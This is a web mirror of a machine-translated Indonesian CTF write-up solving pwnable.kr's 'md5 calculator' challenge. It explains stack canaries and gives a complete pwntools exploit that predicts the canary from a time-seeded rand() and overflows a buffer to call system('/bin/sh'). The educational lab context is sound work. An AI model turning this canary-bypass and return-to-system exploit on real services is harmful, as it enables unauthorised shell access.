<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👆🏿 🌸 💒 Pemecahan masalah dengan kalkulator pwnable.kr 23 - md5. Kami berurusan dengan Stack Canary. Menghubungkan C library dengan python 🛌 🤴🏽 🌃</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, kita akan menyelesaikan tugas ke 23 dari situs pwnable.kr , cari tahu apa stack canary itu dan sambungkan libc dengan python. 

 Inf...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Pemecahan masalah dengan kalkulator pwnable.kr 23 - md5. Kami berurusan dengan Stack Canary. Menghubungkan C library dengan python</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/467485/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="gambar"></div><br>  Pada artikel ini, kita akan menyelesaikan tugas ke 23 dari situs <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">pwnable.kr</a> , cari tahu apa stack canary itu dan sambungkan libc dengan python. <br><br><div class="spoiler">  <b class="spoiler_title">Informasi Organisasi</b> <div class="spoiler_text"> Terutama bagi mereka yang ingin mempelajari sesuatu yang baru dan berkembang di bidang informasi dan keamanan komputer, saya akan menulis dan berbicara tentang kategori berikut: <br><br><ul><li>  PWN; </li><li>  kriptografi (Crypto); </li><li>  teknologi jaringan (Jaringan); </li><li>  membalikkan (Reverse Engineering); </li><li>  steganografi (Stegano); </li><li>  pencarian dan eksploitasi kerentanan WEB. </li></ul><br>  Selain itu, saya akan membagikan pengalaman saya dalam forensik komputer, analisis malware dan firmware, serangan pada jaringan nirkabel dan jaringan area lokal, melakukan pentest dan menulis eksploitasi. <br><a name="habracut"></a><br>  Agar Anda dapat mengetahui tentang artikel baru, perangkat lunak, dan informasi lainnya, saya membuat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">saluran di Telegram</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">grup untuk membahas masalah apa pun</a> di bidang ICD.  Juga, saya pribadi akan mempertimbangkan permintaan pribadi Anda, pertanyaan, saran dan rekomendasi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">secara pribadi dan akan menjawab semua orang</a> . <br><cut></cut><br>  Semua informasi disediakan hanya untuk tujuan pendidikan.  Penulis dokumen ini tidak bertanggung jawab atas kerusakan yang disebabkan seseorang sebagai akibat dari menggunakan pengetahuan dan metode yang diperoleh sebagai hasil dari mempelajari dokumen ini. <br></div></div><br><h2>  Stack canary </h2><br>  Kenari adalah nilai-nilai yang diketahui yang ditempatkan di antara buffer dan mengontrol data pada stack untuk memantau buffer overflows.  Setelah buffer overflow, data pertama yang rusak biasanya adalah kenari.  Dengan demikian, nilai kenari akan diperiksa dan, jika pemeriksaan gagal, sinyal buffer overflow.  Ada tiga jenis kenari: <br><br><ol><li>  Terminator.  Canary dibangun dari terminator nol, CR, LF dan -1.  Akibatnya, penyerang harus menulis karakter nol sebelum menulis alamat pengirim untuk menghindari mengubah kenari.  Ini mencegah serangan menggunakan strcpy () dan metode lain yang kembali saat menyalin karakter nol, sedangkan kenari dikenal tidak diinginkan. </li><li>  Acak  Dibuat secara acak.  Biasanya kenari acak dihasilkan selama inisialisasi program dan disimpan dalam variabel global.  Variabel ini biasanya dilengkapi dengan halaman yang belum dipetakan, jadi mencoba membacanya menggunakan trik apa pun yang menggunakan kesalahan untuk membaca dari RAM menyebabkan kesalahan segmentasi untuk menghentikan program. </li><li>  XOR acak.  Kenari acak yang bertengkar dengan data kontrol.  Dengan demikian, segera setelah kenari atau data kontrol tersumbat, nilai kenari akan salah.  Mereka memiliki kerentanan yang sama dengan kenari acak, kecuali bahwa metode “baca dari tumpukan” untuk mendapatkan kenari sedikit lebih rumit.  Penyerang harus menerima kenari, algoritma, dan data kontrol untuk meregenerasi kenari asli yang diperlukan untuk memalsukan perlindungan. </li></ol><br><h2>  Solusi pekerjaan kalkulator MD5 </h2><br>  Kami melanjutkan bagian kedua.  Saya akan segera mengatakan bahwa ini lebih sulit daripada yang pertama dan kami tidak diberi kode sumber aplikasi.  Jangan lupakan pembahasannya di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> .  Mari kita mulai. <br><br>  Klik pada ikon dengan kalkulator md5 tanda tangan.  Kami diberi alamat dan port untuk menghubungkan dan program itu sendiri. <br><br><img src="https://habrastorage.org/webt/5b/v-/du/5bv-duuvacvvvbfn0r0cubjr_hs.png" alt="gambar"><br><br>  Unduh semua yang mereka berikan kepada kami, periksa binernya. <br><br><img src="https://habrastorage.org/webt/ci/vq/-l/civq-lw135n5ivvsynva66tugg0.png" alt="gambar"><br><br>  Ini adalah elf 32-bit dengan canary yang terpasang dan stack yang tidak dapat dieksekusi.  Kami mendekompilasi dalam IDA Pro. <br><br><img src="https://habrastorage.org/webt/kh/pb/sh/khpbshiztyc2cdt1gr9vuh9h0m8.png" alt="gambar"><br><br>  Program ini memiliki pemeriksaan captcha bawaan.  Kami melihat dua fungsi yang merupakan fungsi yang menarik: my_hash () dan process_hash ().  Mari kita mulai dengan yang pertama. <br><br><img src="https://habrastorage.org/webt/od/4v/tv/od4vtvf9vg_aqdqgnmzhxy2vusy.png" alt="gambar"><br><br>  Mari mendefinisikan kembali tipe variabel dan membuat kode lebih mudah diurai: <br><br><img src="https://habrastorage.org/webt/1z/ak/06/1zak06xcqqrshyerpaq2lyttep0.png" alt="gambar"><br><br>  Dengan demikian, fungsi akan mengembalikan beberapa angka acak.  Pada saat yang sama, v3 adalah data di alamat EBP-0xC.  Mari kita lihat fungsi lain. <br><br><img src="https://habrastorage.org/webt/pn/f8/by/pnf8by2wbojy7iqfzg7ysom29fc.png" alt="gambar"><br><br>  Di sini, variabel v4 mendapatkan nilai di alamat EBP-0xC, dan kemudian bertengkar di pintu keluar dari fungsi dengan nilai ini.  Selanjutnya, 512 byte dialokasikan untuk variabel v3, input keyboard dibaca ke dalam variabel g_buf.  Setelah itu, string dari g_buf didekodekan di Base64 dan ditulis ke v3.  Dari v3 md5 hash dihitung.  Jadi, input ke g_buf dan menyalin ke v3 tidak terbatas, oleh karena itu ada buffer overflow!  Mari kita lihat tumpukannya. <br><br><img src="https://habrastorage.org/webt/nq/kt/7v/nqkt7vssrsxc-nigoxbhsgo-zy0.png" alt="gambar"><br><br>  Variabel v3 adalah stack canary yang terletak setelah buffer.  Program ini juga memanggil fungsi sistem.  Baiklah, kami akan membuat templat untuk dieksploitasi. <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * p = remote(<span class="hljs-string"><span class="hljs-string">'127.0.0.1'</span></span>, <span class="hljs-number"><span class="hljs-number">9002</span></span>) p.recvuntil(<span class="hljs-string"><span class="hljs-string">'captcha : '</span></span>) captcha = int(p.recv()) p.sendline(str(captcha)) p.interactive()</code> </pre> <br>  Untuk mulai dengan, mari kita lihat muatannya.  Kita harus memanggil fungsi sistem dengan parameter "/ bin / sh".  Tetapi karena stack tidak dapat dieksekusi, kita akan memanggil fungsi sistem, meneruskan kontrol ke alamatnya di program, dan sebagai parameter, alamat ke baris “/ bin / sh”, yang akan kita tulis ke g_buf. <br><br>  Jadi (lihat tumpukan): Anda perlu menulis 512 byte sampah, lalu 4 byte nilai kenari, lalu 12 byte sampah lainnya.  Sekarang untuk ret kita harus menentukan alamat fungsi sistem (4 byte), alamat string "/ bin / sh" (4 byte), dan string "/ bin / sh" itu sendiri. <br><br>  Sekarang temukan yang tidak diketahui: alamat panggilan sistem. <br><br><img src="https://habrastorage.org/webt/de/n0/7y/den07ya0t-cdxbpbg5lsu7kefdo.png" alt="gambar"><br><br>  Ini adalah 0x8049187.  Dan alamat string adalah "bin / sh".  Untuk melakukan ini, kita perlu menambahkan jumlah byte ke alamat g_buf ke baris "/ bin / sh", dengan mempertimbangkan pengkodean base64 - ini adalah 4/3 dari nilai asli. <br><br><img src="https://habrastorage.org/webt/bq/qg/qz/bqqgqzug4px0uhx4nj6dhlmlyre.png" alt="gambar"><br><br>  Yaitu, alamat baris: 0x804b0e0 + (512 + 4 + 12 + 4 + 4 + 1) * 4/3 = 0x804b3ac.  Ganti payload. <br><br><pre> <code class="python hljs">payload = <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">512</span></span> payload += p32(canary) payload += <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">12</span></span> payload += p32(<span class="hljs-number"><span class="hljs-number">0x8049187</span></span>) payload += p32(<span class="hljs-number"><span class="hljs-number">0x804b3ac</span></span>) payload = b64e(payload) payload += <span class="hljs-string"><span class="hljs-string">"/bin/sh\x00"</span></span></code> </pre> <br>  Masih menemukan kenari.  Saat kami mengetahuinya, ia merangkum dengan nilai acak dalam fungsi my_hash (), yang hasilnya memberi kami kenari.  Dan srand (waktu (0)) digunakan sebagai seed untuk fungsi rand.  Yaitu, jika kita mengulangi prosedur dalam exploit kita, dan kemudian mengurangi nilai yang dihasilkan dari cookie yang dikirim, kita akan menemukan kenari.  Panggil rand () dari libc dengan python. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time libc=CDLL(<span class="hljs-string"><span class="hljs-string">'libc.so.6'</span></span>) t = int(time.time()) libc.srand(t) n = [libc.rand() <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">8</span></span>)] canary = captcha - n[<span class="hljs-number"><span class="hljs-number">1</span></span>] - n[<span class="hljs-number"><span class="hljs-number">5</span></span>] - n[<span class="hljs-number"><span class="hljs-number">2</span></span>] + n[<span class="hljs-number"><span class="hljs-number">3</span></span>] - n[<span class="hljs-number"><span class="hljs-number">7</span></span>] - n[<span class="hljs-number"><span class="hljs-number">4</span></span>] + n[<span class="hljs-number"><span class="hljs-number">6</span></span>] canary &amp;= <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br>  Itu saja.  Kode lengkapnya terlihat seperti ini. <br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time libc=CDLL(<span class="hljs-string"><span class="hljs-string">'libc.so.6'</span></span>) t = int(time.time()) libc.srand(t) n = [libc.rand() <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">8</span></span>)] p = remote(<span class="hljs-string"><span class="hljs-string">'127.0.0.1'</span></span>, <span class="hljs-number"><span class="hljs-number">9002</span></span>) p.recvuntil(<span class="hljs-string"><span class="hljs-string">'captcha : '</span></span>) captcha = int(p.recv()) p.sendline(str(captcha)) canary = captcha - n[<span class="hljs-number"><span class="hljs-number">1</span></span>] - n[<span class="hljs-number"><span class="hljs-number">5</span></span>] - n[<span class="hljs-number"><span class="hljs-number">2</span></span>] + n[<span class="hljs-number"><span class="hljs-number">3</span></span>] - n[<span class="hljs-number"><span class="hljs-number">7</span></span>] - n[<span class="hljs-number"><span class="hljs-number">4</span></span>] + n[<span class="hljs-number"><span class="hljs-number">6</span></span>] canary &amp;= <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> payload = <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">512</span></span> payload += p32(canary) payload += <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">12</span></span> payload += p32(<span class="hljs-number"><span class="hljs-number">0x8049187</span></span>) payload += p32(<span class="hljs-number"><span class="hljs-number">0x804b3ac</span></span>) payload = b64e(payload) payload += <span class="hljs-string"><span class="hljs-string">"/bin/sh\x00"</span></span> p.sendline(payload) p.interactive()</code> </pre> <br>  Saya menjalankannya beberapa kali dan tidak berhasil, kemudian saya menyadari bahwa karena kecepatan Internet dan perbedaan waktu, hasil rand () tidak cocok.  Diluncurkan di server. <br><br><img src="https://habrastorage.org/webt/mr/9q/im/mr9qimobt_5qk_uf9rbiuszw3cc.png" alt="gambar"><br><br>  Kami mendapatkan bendera yang diinginkan.  Anda dapat bergabung dengan kami di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Telegram</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id467485/">https://habr.com/ru/post/id467485/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id467471/index.html">Jiwa Mikrotik terhadap ILV berjiwa dan penyedia yang sama</a></li>
<li><a href="../id467473/index.html">Dan lebih banyak tentang macam-macam</a></li>
<li><a href="../id467475/index.html">Kembalikan Thread.Abort () ke .NET Core. Pengiriman aplikasi dengan versi CoreCLR dan CoreFX</a></li>
<li><a href="../id467477/index.html">Kubernetes 1.16: Ikhtisar Sorotan</a></li>
<li><a href="../id467479/index.html">Kir Shatrov: Shopify dimulai dengan Rails dan di sini mereka dengan tulus menyukai kerangka ini.</a></li>
<li><a href="../id467487/index.html">Tentang masa depan pembayaran blockchain dan cryptocurrency</a></li>
<li><a href="../id467489/index.html">Mereka adalah variabel statis aneh di PHP</a></li>
<li><a href="../id467493/index.html">Bagaimana menjadi kurang dapat diakses oleh penyerang potensial di Internet. Pengalaman dan pengamatan pribadi</a></li>
<li><a href="../id467495/index.html">Biaya tor-relay</a></li>
<li><a href="../id467497/index.html">Pencuri menggunakan deepfake untuk menipu perusahaan agar mengirimkan uang kepada diri mereka sendiri</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>